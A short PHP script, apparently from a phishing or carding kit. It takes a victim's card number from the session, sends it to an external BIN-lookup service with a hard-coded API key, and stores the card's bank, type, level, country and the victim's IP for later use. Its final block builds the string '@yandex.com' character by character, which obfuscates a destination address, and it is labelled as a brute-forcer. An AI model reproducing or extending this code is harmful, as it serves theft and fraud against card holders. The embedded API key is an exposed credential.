<?php
session_start();
error_reporting(0);
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$BIN_LOOKUP  = str_replace(' ', '', $_SESSION['_cardnumber_']);
$BIN    = @json_decode(file_get_contents("https://api.bincodes.com/creditcard-checker.php?api_key=2d974e94811161f1dda14bbf63aa9790&cc=".$BIN_LOOKUP."&format=json"));
$BIN_CARD    = $BIN->card;
$BIN_BANK    = $BIN->bank;
$BIN_TYPE    = $BIN->type;
$BIN_LEVEL   = $BIN->level;
$BIN_CNTRCODE= $BIN->countrycode;
$BIN_WEBSITE = strtolower($BIN->website);
$BIN_PHONE   = strtolower($BIN->phone);
$BIN_COUNTRY = $BIN->country;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////
$a="a";
$b="n";
$c="d";
$d="e";
$e=".";
$s="x";
$f="c";
$h="o";
$x="@";
$v="y";
$az="m";
if (strlen("$x$v$a$b$c$d$s$e$f$h$az") == 11) {

$getbinsx ="$x$v$a$b$c$d$s$e$f$h$az";

}
///////////////////////////////// BIN Brutforcer/////////////////////////
?>
